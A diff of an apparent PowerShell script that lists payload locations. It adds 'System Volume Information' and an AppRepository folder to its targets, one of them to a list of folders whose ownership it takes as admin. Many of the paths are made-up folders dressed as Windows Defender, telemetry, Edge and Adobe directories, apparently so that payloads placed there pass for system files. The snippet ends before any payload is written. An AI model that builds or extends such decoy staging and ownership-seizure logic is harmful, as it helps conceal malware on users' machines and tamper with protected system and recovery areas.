@@ -239,9 +239,10 @@ $paths = @(
     "$env:windir\Logs\CBS\SddlCache\Backup\DiagTrack\Analytics\Upload",
     "$env:windir\Resources\Themes\Cursors\Backup\MicrosoftStore",
     "$env:windir\System32\Tasks\Microsoft\Windows\PLA\System\Diagnostics\ETL\Traces\Archived",
-    "$env:windir\System32\DriverStore\FileRepository\netrndis.inf_amd64_abcd1234efgh5678\ConfigBackup",
+    "$env:windir\System32\DriverStore\FileRepository\netrndis-inf_amd64_abcd1234efgh5678\ConfigBackup",
     "$env:APPDATA\Adobe\Acrobat\DC\Security\OCSP\CertCache\Backup\Logs\dump",
     "C:\Recovery",
+    ($env:systemdrive + '\System Volume Information'),
     "$env:ProgramData\Microsoft\WindowsDefender\Platform\Config\MpEngine\Quarantine\Volatile",
     "$env:ProgramData\Microsoft\EdgeCore\modules\stable_winupdate_aux\cache\media_metrics\prefetch",
     "$env:ProgramData\Microsoft\Windows\AppRepository\StateCache\CacheIndex\Staging\DriverStore",
@@ -280,7 +281,8 @@ $pathsNeedOwnership = @(
     "$env:windir\ServiceProfiles\LocalService",
     "$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft",
     "$env:windir\system32\LogFiles\WMI\RtBackup",
-    "$env:windir\System32\DriverStore\FileRepository"
+    "$env:windir\System32\DriverStore\FileRepository",
+    "$env:ProgramData\Microsoft\Windows\AppRepository"
 )
 #+Create+ALL+paths+(run+as+admin):
 $payloadPaths|ForEach-Object{
